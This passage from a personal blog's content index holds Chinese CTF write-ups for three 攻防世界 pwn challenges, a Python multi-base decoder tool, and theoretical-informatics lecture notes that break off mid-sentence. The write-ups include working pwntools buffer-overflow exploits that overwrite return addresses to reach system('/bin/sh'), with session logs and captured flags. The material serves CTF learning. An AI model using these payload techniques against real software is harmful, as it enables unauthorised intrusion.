前面AB的部分会覆盖掉buf以及saved_registers，以至于可以用p64(0x400596)覆盖掉函数的返回地址，也就是说会直接调用callsystem这个函数。调用了之后只需要使用ls和cat flag命令即可读取flag。 Exploit代码： 1234567891011121314151617181920212223242526272829303132from pwn import *r = remote(&quot;61.147.171.105&quot;, 49676)res = r.recvline()print(res)payload = b&quot;A&quot; * 128 + b&quot;B&quot;*8 + p64(0x400596)r.sendline(payload)r.interactive()# [x] Opening connection to 61.147.171.105 on port 49676# [x] Opening connection to 61.147.171.105 on port 49676: Trying 61.147.171.105# [+] Opening connection to 61.147.171.105 on port 49676: Done# b&#x27;Hello, World\\n&#x27;# [*] Switching to interactive mode# ls# bin# dev# flag# level0# lib# lib32# lib64# cat flag# cyberpeace&#123;f400f63c7cea1e147b6960fc106b45f0&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Pwn","slug":"CTF/Pwn","permalink":"https://archer-baiyi.github.io/categories/CTF/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://archer-baiyi.github.io/tags/Pwn/"},{"name":"攻防世界","slug":"攻防世界","permalink":"https://archer-baiyi.github.io/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"}]},{"title":"攻防世界 level2 Writeup","slug":"CTF/Pwn/攻防世界-level2-Writeup","date":"2025-05-12T08:24:30.000Z","updated":"2025-05-12T15:03:10.666Z","comments":true,"path":"2025/05/12/CTF/Pwn/攻防世界-level2-Writeup/","permalink":"https://archer-baiyi.github.io/2025/05/12/CTF/Pwn/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level2-Writeup/","excerpt":"","text":"观察用ida打开文件查看main函数： 可以发现没有输入长度限制。 接着查看vulnerable_function()的stack结构： 此外，main函数自己会调用system()： 现在来找call _system这个命令的地址： 在这个页面右键点击_system并选择Text view： 便可以确定这行命令在text（即代码）部分的地址： 10804849E 接着使用Shift+F12查看文件里的string： 由于system函数实际上接受的是一个字符串的指针，所以我们可以直接用在上面找到的/bin/sh的地址并将其作为参数传给system函数。 注意！这个程序是32bit的。 可以通过很多方面来判断： 程序中使用了eax, ecx, esp, ebp等寄存器。这些都是32位寄存器。 （如果是 64 位程序，寄存器通常会是：rax, rcx, rsp, rbp, 等。） 地址宽度是32bit的（最简单也是最重要的判断条件） 所以之后需要使用pwn库的p32()，而不是p64()。 Exploit我们做以下操作： 覆盖掉buf以及saved_registers部分（=136+4） 将vulnerable_function()的返回地址修改成call _system()的地址 将system()函数的参数改为/bin/sh的地址 便可以成功打开shell。 所以我们需要做的是发送这段内容： 123payload = b&quot;a&quot; * (136 + 4) # buf 以及 saved_registers 的部分payload += p32(0x0804849E) # call _system() 的地址payload += p32(0x0804A024) # /bin/sh 的地址 之后便是使用ls以及cat flag命令读取flag。 Exploit代码： 123456789101112131415161718192021222324252627282930from pwn import *r = remote(&quot;223.112.5.141&quot;, 50648)print(r.recvline())payload = b&quot;a&quot; * (136 + 4) # buf 以及 saved_registers 的部分payload += p32(0x0804849E) # call _system() 的地址payload += p32(0x0804A024) # /bin/sh 的地址r.sendline(payload)r.interactive()# [x] Opening connection to 223.112.5.141 on port 50648# [x] Opening connection to 223.112.5.141 on port 50648: Trying 223.112.5.141# [+] Opening connection to 223.112.5.141 on port 50648: Done# b&#x27;Input:\\n&#x27;# [*] Switching to interactive mode# ls# bin# dev# flag# level2# lib# lib32# lib64# cat flag# cyberpeace&#123;630b1c1c66bca13f722670008c4ec2af&#125;# [*] Interrupted# [*] Closed connection to 223.112.5.141 port 50648","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Pwn","slug":"CTF/Pwn","permalink":"https://archer-baiyi.github.io/categories/CTF/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://archer-baiyi.github.io/tags/Pwn/"},{"name":"攻防世界","slug":"攻防世界","permalink":"https://archer-baiyi.github.io/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"}]},{"title":"攻防世界 hello_pwn Writeup","slug":"CTF/Pwn/攻防世界-hello-pwn-Writeup","date":"2025-05-12T08:00:16.000Z","updated":"2025-05-12T15:03:23.486Z","comments":true,"path":"2025/05/12/CTF/Pwn/攻防世界-hello-pwn-Writeup/","permalink":"https://archer-baiyi.github.io/2025/05/12/CTF/Pwn/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-hello-pwn-Writeup/","excerpt":"","text":"观察用ida打开文件查看main函数： 查看sub_400686()： 也就是说我们如果可以满足if的条件便可以得到flag。 查看unk_601068和dword_60106C的位置（直接点击这2个变量即可）： 可以发现他们的地址只差了4Byte。 Exploit我们需要做的是发送一段内容，结构如下： 1payload = b&quot;AAAA&quot; + p32(1853186401) 首先将它们中间差的4个Byte给填满，然后便可以将dword_60106C原本的内容覆盖成满足if要求的值，之后便可以直接得到flag。 Exploit代码： 1234567891011121314151617181920212223242526from pwn import *r = remote(&quot;61.147.171.105&quot;, 59747)res = r.recvline()print(res)res = r.recvline()print(res)payload = b&quot;AAAA&quot; + p32(1853186401)r.sendline(payload)res = r.recvall()print(res)# [x] Opening connection to 61.147.171.105 on port 59747# [x] Opening connection to 61.147.171.105 on port 59747: Trying 61.147.171.105# [+] Opening connection to 61.147.171.105 on port 59747: Done# b&#x27;~~ welcome to ctf ~~ \\n&#x27;# b&#x27;lets get helloworld for bof\\n&#x27;# [x] Receiving all data# [x] Receiving all data: 0B# [x] Receiving all data: 45B# [+] Receiving all data: Done (45B)# [*] Closed connection to 61.147.171.105 port 59747# b&#x27;cyberpeace&#123;7ffb977ba34907b01a6b6b74280a5921&#125;\\n&#x27;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Pwn","slug":"CTF/Pwn","permalink":"https://archer-baiyi.github.io/categories/CTF/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://archer-baiyi.github.io/tags/Pwn/"},{"name":"攻防世界","slug":"攻防世界","permalink":"https://archer-baiyi.github.io/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"}]},{"title":"解码器","slug":"CTF/Crypto/解码器","date":"2025-05-11T18:50:59.000Z","updated":"2025-05-11T19:04:03.148Z","comments":true,"path":"2025/05/11/CTF/Crypto/解码器/","permalink":"https://archer-baiyi.github.io/2025/05/11/CTF/Crypto/%E8%A7%A3%E7%A0%81%E5%99%A8/","excerpt":"","text":"用Python写了一个自动解码的软件，可以自动进行多轮的base 32，58，64，91，二进制以及hex解码。 （后续可能会更新。） 效果 如果可以成功解码成text，则直接输出text： 如果不能，则输出hex作为保底： 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136import tkinter as tkfrom tkinter import scrolledtextimport base64import reimport base58import base91def is_binary(s): return all(c in &#x27;01&#x27; for c in s) and len(s) % 8 == 0def decode_bytes(byte_data): try: text = byte_data.decode(&#x27;utf-8&#x27;) return text, True except UnicodeDecodeError: return byte_data.hex(), Falsedef looks_like_base64(s): return len(s) % 4 == 0 and re.fullmatch(r&#x27;[A-Za-z0-9+/=]+&#x27;, s) is not Nonedef looks_like_base32(s): return len(s) % 8 == 0 and re.fullmatch(r&#x27;[A-Z2-7=]+&#x27;, s, re.IGNORECASE) is not Nonedef looks_like_base58(s): return all(c in base58.alphabet.decode() for c in s)def looks_like_base91(s): return all(33 &lt;= ord(c) &lt;= 126 for c in s)def try_decode(s, func): decoded = func(s) return decode_bytes(decoded)def recursive_decode(s, path=None, all_paths=None, max_depth=10): if path is None: path = [] if all_paths is None: all_paths = [] if len(path) &gt;= max_depth: return all_paths decoders = [ (&#x27;Base64&#x27;, looks_like_base64, base64.b64decode), (&#x27;Base32&#x27;, looks_like_base32, base64.b32decode), (&#x27;Base58&#x27;, looks_like_base58, base58.b58decode), (&#x27;Base91&#x27;, looks_like_base91, base91.decode), (&#x27;Binary&#x27;, is_binary, lambda x: bytes(int(x[i:i+8], 2) for i in range(0, len(x), 8))), (&#x27;Hex&#x27;, lambda x: True, lambda x: bytes.fromhex(x)), ] for name, detector, func in decoders: if detector(s): try: text, is_utf8 = try_decode(s, func) except Exception: continue mode = &#x27;(UTF-8)&#x27; if is_utf8 else &#x27;(hex)&#x27; new_path = path + [(name, text, mode)] all_paths.append(new_path) if is_utf8: recursive_decode(text, new_path, all_paths, max_depth) return all_pathsdef select_final_path(paths): utf_paths = [p for p in paths if p[-1][2] == &#x27;(UTF-8)&#x27;] if utf_paths: max_len = max(len(p) for p in utf_paths) for p in utf_paths: if len(p) == max_len: return p max_len = max(len(p) for p in paths) for p in paths: if len(p) == max_len: return pdef decode_input(): raw = input_text.get(&#x27;1.0&#x27;, tk.END).strip().replace(&#x27; &#x27;, &#x27;&#x27;) output_text.delete(&#x27;1.0&#x27;, tk.END) if not raw: return paths = recursive_decode(raw) if not paths: output_text.insert(tk.END, &#x27;无法识别或解码此内容。&#x27;) return final = select_final_path(paths) for i, (name, text, mode) in enumerate(final, 1): output_text.insert(tk.END, f&quot;第&#123;i&#125;步 - &#123;name&#125; &#123;mode&#125;\\n结果：&#123;text&#125;\\n\\n&quot;) # 如果只有一步且为 UTF-8，但结果仍可能是编码串，则额外尝试一次解码并输出 hex if len(final) == 1 and final[0][2] == &#x27;(UTF-8)&#x27;: s = final[0][1] extra_decoders = [ (&#x27;Base64&#x27;, looks_like_base64, base64.b64decode), (&#x27;Base32&#x27;, looks_like_base32, base64.b32decode), (&#x27;Base58&#x27;, looks_like_base58, base58.b58decode), (&#x27;Base91&#x27;, looks_like_base91, base91.decode), (&#x27;Binary&#x27;, is_binary, lambda x: bytes(int(x[i:i+8], 2) for i in range(0, len(x), 8))) ] for name, detector, func in extra_decoders: if detector(s): try: data = func(s) hex_out = data.hex() output_text.insert(tk.END, f&quot;第2步 - &#123;name&#125; (hex)\\n结果：&#123;hex_out&#125;\\n&quot;) break except Exception: continue# GUIroot = tk.Tk()root.title(&#x27;解码器&#x27;)root.geometry(&#x27;600x500&#x27;)font_title = (&#x27;微软雅黑&#x27;, 12, &#x27;bold&#x27;)font_text = (&#x27;微软雅黑&#x27;, 10)tk.Label(root, text=&#x27;请输入编码内容：&#x27;, font=font_title).pack(pady=(10,0))input_text = scrolledtext.ScrolledText(root, height=6, font=font_text, wrap=tk.WORD)input_text.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)tk.Button(root, text=&#x27;开始解码&#x27;, font=font_title, bg=&#x27;#4CAF50&#x27;, fg=&#x27;white&#x27;, command=decode_input).pack(pady=10)tk.Label(root, text=&#x27;解码输出：&#x27;, font=font_title).pack()output_text = scrolledtext.ScrolledText(root, height=10, font=font_text, wrap=tk.WORD)output_text.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)root.mainloop() 打包可以用pyinstaller将这个程序打包成.exe软件。 如果没有安装，则运行： 1pip install pyinstaller 安装好后运行（先将当前python脚本保存为decoder.py）： 1pyinstaller --noconfirm --windowed --onefile .\\decoder.py .exe文件应该会生成在当前目录下的： 1dist/decoder.exe 测试随机生成一段进行过多轮base编码的内容： 12345678910111213141516171819202122232425262728import base64import base58import randomtext = &quot;hello world&quot;data = text.encode(&#x27;utf-8&#x27;)encodings = [&#x27;base64&#x27;, &#x27;base32&#x27;, &#x27;base58&#x27;]history = []for i in range(10): encoding = random.choice(encodings) history.append(encoding) if encoding == &#x27;base64&#x27;: data = base64.b64encode(data) elif encoding == &#x27;base32&#x27;: data = base64.b32encode(data) elif encoding == &#x27;base58&#x27;: data = base58.b58encode(data)print(&quot;Final encoded result:&quot;, data.decode(&#x27;utf-8&#x27;))print(&quot;Encoding history:&quot;, history)# Final encoded result: VlRKek1WWldTbFphUmxwU1RWWktUVlJyVWt0U2JGRjRXa1ZXVm1FeVVsQlZha1pYVld4YVZsUnJUbFJoTUhCaFZtMXpkMlZzVWtkUmF6RlNWbTE0VmxWNlFYaFVSbHBYVVd0T1dGWnNXa1ZXTW5SUFUxWktObFpzYUZkV1YwNDJWbFJDVjFWRk5WZGhSVnBWVm14d1ZGWXhWWGhXTVZKV1YydG9WV0V3TlZaV1JFWmhVbFpLY2xac1pGWk5SRVpLVlcxd1MxTkdVbGRYYkZKVFZsUldVRlpGVmxOV1JsWnlWVmhzVldFelFsQlZiRkpUVjJ4VmVHSkZPVlZoTWxKSlZtcEdTMVV4Vm5KUFZtUlNUVVp3VTFZeFVrdFVRVDA5# Encoding history: [&#x27;base64&#x27;, &#x27;base64&#x27;, &#x27;base32&#x27;, &#x27;base58&#x27;, &#x27;base58&#x27;, &#x27;base32&#x27;, &#x27;base64&#x27;, &#x27;base64&#x27;, &#x27;base64&#x27;, &#x27;base64&#x27;] 程序的输出为： 123456789101112131415161718192021222324252627282930第1步 - Base64 (UTF-8)结果：VTJzMVZWSlZaRlpSTVZKTVRrUktSbFF4WkVWVmEyUlBVakZXVWxaVlRrTlRhMHBhVm1zd2VsUkdRazFSVm14VlV6QXhURlpXUWtOWFZsWkVWMnRPU1ZKNlZsaFdWV042VlRCV1VFNVdhRVpVVmxwVFYxVXhWMVJWV2toVWEwNVZWREZhUlZKclZsZFZNREZKVW1wS1NGUldXbFJTVlRWUFZFVlNWRlZyVVhsVWEzQlBVbFJTV2xVeGJFOVVhMlJJVmpGS1UxVnJPVmRSTUZwU1YxUktUQT09第2步 - Base64 (UTF-8)结果：U2s1VVJVZFZRMVJMTkRKRlQxZEVVa2RPUjFWUlZVTkNTa0paVmswelRGQk1RVmxVUzAxTFZWQkNXVlZEV2tOSVJ6VlhWVWN6VTBWUE5WaEZUVlpTV1UxV1RVWkhUa05VVDFaRVJrVldVMDFJUmpKSFRWWlRSVTVPVEVSVFVrUXlUa3BPUlRSWlUxbE9Ua2RIVjFKU1VrOVdRMFpSV1RKTA==第3步 - Base64 (UTF-8)结果：Sk5URUdVQ1RLNDJFT1dEUkdOR1VRVUNCSkJZVk0zTFBMQVlUS01LVVBCWVVDWkNIRzVXVUczU0VPNVhFTVZSWU1WTUZHTkNUT1ZERkVWU01IRjJHTVZTRU5OTERTUkQyTkpORTRZU1lOTkdHV1JSUk9WQ0ZRWTJL第4步 - Base64 (UTF-8)结果：JNTEGUCTK42EOWDRGNGUQUCBJBYVM3LPLAYTKMKUPBYUCZCHG5WUG3SEO5XEMVRYMVMFGNCTOVDFEVSMHF2GMVSENNLDSRD2NJNE4YSYNNGGWRRROVCFQY2K第5步 - Base32 (UTF-8)结果：KfCPSW4GXq3MHPAHqVmoX151TxqAdG7mCnDwnFV8eXS4SuFRVL9tfVDkV9DzjZNbXkLkF1uDXcJ第6步 - Base58 (UTF-8)结果：4npCTEQcUgxRUY2DRDCpq4jmaCGw8BXZ557XUXvaYf6cK63oEYV1SwW第7步 - Base58 (UTF-8)结果：LFKWIV3DGJFEQT2HMRVU22TMGVMWWZCSKBIT2PI=第8步 - Base32 (UTF-8)结果：YUdWc2JHOGdkMjl5YkdRPQ==第9步 - Base64 (UTF-8)结果：aGVsbG8gd29ybGQ=第10步 - Base64 (UTF-8)结果：hello world","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/categories/CTF/Crypto/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/tags/CTF/"},{"name":"decode","slug":"decode","permalink":"https://archer-baiyi.github.io/tags/decode/"},{"name":"解码","slug":"解码","permalink":"https://archer-baiyi.github.io/tags/%E8%A7%A3%E7%A0%81/"},{"name":"base 64","slug":"base-64","permalink":"https://archer-baiyi.github.io/tags/base-64/"}]},{"title":"Theoretische Informatik 理论信息学","slug":"TUM info 笔记/Theoretische Informatik/Theoretische-Informatik-理论信息学","date":"2025-04-27T21:56:41.000Z","updated":"2025-05-12T18:33:42.106Z","comments":true,"path":"2025/04/27/TUM info 笔记/Theoretische Informatik/Theoretische-Informatik-理论信息学/","permalink":"https://archer-baiyi.github.io/2025/04/27/TUM%20info%20%E7%AC%94%E8%AE%B0/Theoretische%20Informatik/Theoretische-Informatik-%E7%90%86%E8%AE%BA%E4%BF%A1%E6%81%AF%E5%AD%A6/","excerpt":"理论信息学相关笔记","text":"基本概念Definition:一个字母表（Alphabet） $\\Sigma$ 是一个有限集合。例如：$ \\{0,1\\} $、ASCII、Unicode。一个单词/字符串 （Wort/String）是由$\\Sigma$中字符组成的有限序列，例如 010。$|w|$表示单词$ w $ 的长度。空单词（leere Wort）（长度为 0 的唯一单词）用$\\varepsilon$表示。如果 $u$ 和 $v$ 是单词，则 $uv$ 表示它们的连接（Konkatenation）。如果 $ w $ 是一个单词，那么 $w^n$ 定义为：$ w^0 = \\varepsilon $，并且 $ w^{n+1} = w w^n $。例如：$ (ab)^3 = ababab $。$ \\Sigma^* $ 是所有由 $ \\Sigma $ 中字符组成的单词的集合（Menge aller Wörter）。其中的子集$ L \\subseteq \\Sigma^* $ 被称为（形式）语言 （(formale) Sprache）。 注意，这里的形式语言（(formale) Sprache）$L$并没有要求必须包含$\\varepsilon$。 来看一下简单的（形式）语言 （(formale) Sprache）的例子： 杜登（Duden）词典中所有单词的集合 $L_1 = \\{ \\varepsilon, ab, abab, ababab, \\dots \\} = \\{ (ab)^n \\mid n \\in \\mathbb{N} \\}$ （$\\Sigma_1 = \\{a, b\\}$） $L_2 = \\{ \\varepsilon, ab, aabb, abab, abba, baab, baba, bbaa, \\dots \\} = \\{ w \\in \\{a,b\\}^* \\mid w\\ \\text{中包含相同数量的}\\ a\\ \\text{和}\\ b\\ \\text{字符} \\}$ （$\\Sigma_2 = \\{a, b\\}$） $L_3 = \\{0, 1, 100, 1001, 10000, \\dots\\} = \\{ w \\in \\{0,1\\}^* \\mid w\\ \\text{是一个二进制编码的平方数} \\}$ （$\\Sigma_3 = \\{0,1\\}$） $\\emptyset$ $\\{\\varepsilon\\}$ 反例： $\\varepsilon$ 或 $ab$ 不是语言，因为它们不是集合。 Definition: 语言上的运算（Operationen auf Sprachen）设 $A, B \\subseteq \\Sigma^*$：连接（Konkatenation）：$AB := \\{ uv \\mid u \\in A \\land v \\in B \\}$例子：$\\{ab, b\\} \\{a, bb\\} = \\{aba, abbb, ba, bbb\\}$A^n := \\{ w_1 \\dots w_n \\mid w_1, \\dots, w_n \\in A \\} = \\underbrace{A \\cdots A}_{n}例子：$\\{ab, ba\\}^2 = \\{abab, abba, baab, baba\\}$递归定义：$A^0 = \\{\\varepsilon\\} \\quad \\text{且} \\quad A^{n+1} := A A^n$A^* := \\{ w_1 \\dots w_n \\mid n \\geq 0 \\land w_1, \\dots, w_n \\in A \\} = \\bigcup_{n \\in \\mathbb{N}} A^n例子：\\{01\\}^* = \\{\\varepsilon, 01, 0101, 010101, \\dots\\} \\neq \\{0,1\\}^*A^+ := AA^* = \\bigcup_{n \\geq 1} A^n 注意，因为$A^0 = \\{ \\varepsilon \\}$，所以对于所有 $A$ 都有：$\\varepsilon \\in A^$，并且 $\\emptyset^ = \\{ \\varepsilon \\}$。 Lemma:$\\emptyset A = \\emptyset$$\\{\\varepsilon\\}A = A$ 证明：Trivial。$\\square$ Lemma:$A(B \\cup C) = AB \\cup AC$$(A \\cup B)C = AC \\cup BC$ 证明：Trivial。$\\square$ 但是注意，$A(B \\cap C) \\neq AB \\cap AC$不一定一直成立。 反例：$A=\\{a,ab\\}, B=\\{b\\}, C =\\{\\varepsilon\\}$： A(B\\cap C) = A \\emptyset = \\emptyset AB \\cap AC = \\{ab,abb\\} \\cap \\{a,ab\\} = \\{ab\\} \\neq \\emptyset最根本的原因是可能存在$u’v’= u’’v’’ \\in AB \\cap AC$并且$u’ \\neq u’’, v’ \\neq v’’$。这就导致不能从$uv \\in AB \\cap AC$推出存在$u \\in A, v \\in B \\cap C$。 Lemma:A^* A^* = A^* 证明：Trivial。$\\square$ 文法（Grammatiken）Definition:一个文法（Grammatik）是一个四元组 $G = (V, \\Sigma, P, S)$，其中：$V$ 是一组非终结符号（Nichtterminalzeichen / Nichtterminale / Variablen）的有限集合；$\\Sigma$ 是一组终结符号（Terminalzeichen / Terminale / Alphabet），与 $V$ 不相交；P \\subseteq (V \\cup \\Sigma)^* \\times (V \\cup \\Sigma)^*是一组产生式（Produktionen）的集合；$S \\in V$ 是开始符号（Startsymbol）。 为了方便，我们一般用： $\\alpha \\to \\beta$ 指代 $(\\alpha, \\beta) \\in P$； $\\alpha \\to \\beta_1|\\cdots |\\beta_n$ 指代 $\\alpha \\to \\beta_1, …, \\alpha \\to \\beta_n$ Definition:一个文法（Grammatik） $G = (V, \\Sigma, P, S)$ induziert 一个推导关系 $\\to_G$，作用于 $V \\cup \\Sigma$ 上的单词：\\alpha \\to_G \\alpha'当且仅当存在一条规则 $\\beta \\to \\beta’$ 属于 $P$，以及单词 $\\alpha_1, \\alpha_2$，使得\\alpha = \\alpha_1 \\beta \\alpha_2 \\quad \\text{且} \\quad \\alpha' = \\alpha_1 \\beta' \\alpha_2.一个这样的序列\\alpha_1 \\to_G \\alpha_2 \\to_G \\cdots \\to_G \\alpha_n叫做从 $\\alpha_1$ 开始的推导（Ableitung）。如果 $\\alpha_1 = S$ 并且\\alpha_n \\in \\Sigma^* ，那么 $G$ 生成（erzeugt）单词 $\\alpha_n$。$G$ 的语言（Sprache von G）是所有由 $G$ 生成的单词的集合，记为 $L(G)$。 注意，定义里的$\\alpha_1, \\alpha_2$可以是$\\varepsilon$，也可以是其他单词的Konkatenation。所以在一个大的Konkatenation里，对于其中一个存在Produktion，那么对整个Konkatenation都存在一个推导。 例子： $V = \\{ \\langle \\text{Expr} \\rangle, \\langle \\text{Term} \\rangle, \\langle \\text{Factor} \\rangle \\}$ $\\Sigma = \\{ a, b, c, +, *, (, ) \\}$ $S = \\langle \\text{Expr} \\rangle$ $P$： \\begin{align} \\langle \\text{Expr} \\rangle &\\to \\langle \\text{Term} \\rangle \\\\ \\langle \\text{Expr} \\rangle &\\to \\langle \\text{Expr} \\rangle + \\langle \\text{Term} \\rangle \\\\ \\langle \\text{Term} \\rangle &\\to \\langle \\text{Factor} \\rangle \\\\ \\langle \\text{Term} \\rangle &\\to \\langle \\text{Term} \\rangle * \\langle \\text{Factor} \\rangle \\\\ \\langle \\text{Factor} \\rangle &\\to a\\ \\mid\\ b\\ \\mid\\ c \\\\ \\langle \\text{Factor} \\rangle &\\to (\\langle \\text{Expr} \\rangle) \\end{align} 该如何从$\\langle \\text{Expr} \\rangle$推导出$a * (b + c)$呢？ \\begin{align*} \\langle \\text{Expr} \\rangle &\\xrightarrow{1} \\langle \\text{Term} \\rangle \\xrightarrow{4} \\langle \\text{Term} \\rangle * \\langle \\text{Factor} \\rangle \\xrightarrow{3} \\langle \\text{Factor} \\rangle * \\langle \\text{Factor} \\rangle \\\\ &\\xrightarrow{5} a * \\langle \\text{Factor} \\rangle \\xrightarrow{6} a * (\\langle \\text{Expr} \\rangle) \\xrightarrow{2} a * (\\langle \\text{Expr} \\rangle + \\langle \\text{Term} \\rangle) \\\\ &\\xrightarrow{1} a * (\\langle \\text{Term} \\rangle + \\langle \\text{Term} \\rangle) \\xrightarrow{3} a * (\\langle \\text{Factor} \\rangle + \\langle \\text{Term} \\rangle) \\xrightarrow{3} a * (\\langle \\text{Factor} \\rangle + \\langle \\text{Factor} \\rangle)\\\\ &\\xrightarrow{5} a * (b + \\langle \\text{Factor} \\rangle) \\xrightarrow{5} a * (b+ c) \\end{align*}一共需要11步。 例子： 这两个语法： \\begin{align*} G_1: \\quad S &\\to abcS \\mid \\epsilon \\\\ ba &\\to ab \\\\ cb &\\to bc \\\\ ca &\\to ac \\end{align*} \\begin{align*} G_1: \\quad S &\\to aBSc \\mid \\epsilon \\\\ Ba &\\to aB \\\\ Bb &\\to bB \\\\ Bc &\\to bc \\end{align*}哪个可以生成$M = \\{ a^n b^n c^n \\mid n \\geq 0 \\}$呢？ 首先，有$M \\subseteq L(G_1)$，因为$S \\to abcS \\to abcabcS \\to abcabc \\to abacbc \\to aabcbc \\to aabbcc$。 只不过$L(G_1) \\neq M$，因为$S \\to abcS \\to abcabcS \\to abcabc$。 而$L(G_2) = M$，因为： S \\to aBSc \\to aBaBcc \\to aBaBcc \\to aaBBcc \\to aaBbcc \\to aabBcc \\to aabbcc.Definition: (Reflexive transitive Hülle)\\begin{align*}\\alpha &\\to_G^0 \\alpha \\\\\\alpha &\\to_G^{n+1} \\gamma \\quad :\\Leftrightarrow \\quad \\exists \\beta.\\ \\alpha \\to_G^n \\beta \\to_G \\gamma \\\\\\alpha &\\to_G^* \\beta \\quad :\\Leftrightarrow \\quad \\exists n.\\ \\alpha \\to_G^n \\beta \\\\\\alpha &\\to_G^+ \\beta \\quad :\\Leftrightarrow \\quad \\exists n > 0.\\ \\alpha \\to_G^n \\beta\\end{align*} 不难注意到有： L(G) = \\{ w \\in \\Sigma^* | S \\to_G^* w \\}.例子：在前面的例子我们已经看到了$\\langle \\text{Expr} \\rangle$推导出$a * (b + c)$需要11步，所以有 \\langle \\text{Expr} \\rangle \\to_G^{11} a * (b + c)并因此有 \\langle \\text{Expr} \\rangle \\to_G^* a * (b + c)和 \\langle \\text{Expr} \\rangle \\to_G^+ a * (b + c)乔姆斯基体系（Chomsky Hierarchie）Definition:一个文法 $G$ 的类型定义如下：类型 0：始终成立。类型 1：如果对于每一个产生式 $\\alpha \\to \\beta$（除了 $S \\to \\varepsilon$）都有|\\alpha| \\leq |\\beta|并且，如果 $S \\to \\varepsilon$ 是一个产生式，则 $S$ 不出现在任何 $\\beta$ 中。类型 2：如果 $G$ 是类型 1 的文法，并且对于每个产生式 $\\alpha \\to \\beta$，都有\\alpha \\in V类型 3：如果 $G$ 是类型 2 的文法，并且对于每个产生式 $\\alpha \\to \\beta$（除了 $S \\to \\varepsilon$）都有\\beta \\in \\Sigma \\cup \\Sigma V 显然有： \\text{Typ 3} \\subseteq \\text{Typ 2} \\subseteq \\text{Typ 1} \\subseteq \\text{Typ 0}Theorem:L(\\text{Typ 3}) \\subseteq L(\\text{Typ 2}) \\subseteq L(\\text{Typ 1}) \\subseteq L(\\text{Typ 0}) Typ Grammatikart Sprachklasse Typ 3 Rechtslineare Grammatik Reguläre Sprachen Typ 2 Kontextfreie Grammatik Kontextfreie Sprachen Typ 1 Kontextsensitive Grammatik Kontextsensitive Sprachen Typ 0 Phrasenstrukturgrammatik Rekursiv aufzählbare Sprachen Wortproblem： Gegeben: 一个文法 $G$ 和一个单词 $w \\in \\Sigma^*$， Frage：$w$ 是否属于 $L(G)$？ 正规语言（Reguläre Sprachen）等价关系： Deterministische endliche AutomatenDefinition:Ein deterministischer endlicher Automat (deterministic finite automaton, DFA)$M = (Q, \\Sigma, \\delta, q_0, F)$ besteht auseiner endlichen Menge von Zuständen $Q$,einem (endlichen) Eingabealphabet $\\Sigma$,einer (totalen!) Übergangsfunktion $\\delta : Q \\times \\Sigma \\rightarrow Q$,einem Startzustand $q_0 \\in Q$, undeiner Menge $F \\subseteq Q$ von Endzuständen (akzeptierenden Zust.). 名字里的deterministisch是指：对于每一个状态（Zustand）以及一个Übergang只对应一个状态（Zustand）。 Definition:Die von $M$ akzeptierte Sprache istL(M) := \\{ w \\in \\Sigma^* \\mid \\hat{\\delta}(q_0, w) \\in F \\},wobei $\\hat{\\delta} : Q \\times \\Sigma^* \\rightarrow Q$ induktiv definiert ist durch:\\begin{aligned}\\hat{\\delta}(q, \\varepsilon) &= q \\\\\\hat{\\delta}(q, aw) &= \\hat{\\delta}(\\delta(q, a), w) \\quad \\text{für } a \\in \\Sigma,\\, w \\in \\Sigma^*.\\end{aligned}( $\\hat{\\delta}(q, w)$ bezeichnet den Zustand, den man aus $q$ mit $w$ erreicht. )Eine Sprache ist regulär gdw. sie von einem DFA akzeptiert wird. 可以这样理解$\\hat{\\delta}$：第一个参数是起始状况（Zustand），然后第二个参数的一连串的路径（或者说是操作），会依次触发/经过。 所以 L(M) := \\{ w \\in \\Sigma^* \\mid \\hat{\\delta}(q_0, w) \\in F \\},里的元素翻译一下就是：所有从起点到终点的路径/操作序列。 所有endliche Automaten都可以用gerichtete und makierte Zustandsgraph表示出来，其中 点（Knoten）代表Zustände； 线（Kanten）表示Übergänge $p \\xrightarrow{a} q$ ，即$\\delta(p,a)= q$； Anfangszustand 会被用一个箭头（Pfeil）标记出来； Endzustände 会被用doppelte Kreise标记出来。 例子： $Q = \\{0,1,2\\}$ $\\Sigma = \\{a,b\\}$ 不难注意到，在这里例子里，所有可以被akzeptiert的Wort都一定包含ab。（相当于必经之路） 同样，所有包含ab的Wort也一定会被akzeptiert。 例子： 我们用#w表示w的二进制。（比如说#100=4） 不难发现，DFA akzeptiert $w \\in \\{0,1\\}^*$当且仅当#w是偶数。 证明： 假设$w \\neq \\varepsilon$，可以通过 \\hat{\\delta}(0, w0) = \\delta(\\hat{\\delta}(0, w), 0) = 0 \\in F \\hat{\\delta}(0, w1) = \\delta(\\hat{\\delta}(0, w), 1) = 1 \\notin F可以得到 w0 \\in L(A), w1 \\notin L(A)即$w \\in L(A) \\Leftrightarrow w\\text{为偶数}$。（也就是二进制的最低位等于0） 如果$w = \\varepsilon$，有$\\hat{\\delta}(0, \\varepsilon) = 0$，所以$\\varepsilon \\in L(A)$。（注意 #$\\varepsilon = 0$）$\\square$ Von rechtslinearen Grammatiken zu DFA (und zurück)Rechtslineare Grammatik（即Typ3）指的是所有Produktion都长这样：$A \\to a$ 或者$A \\to aB$。 Definition:Ein nichtdeterministischer endlicher Automat (nondeterministic finite 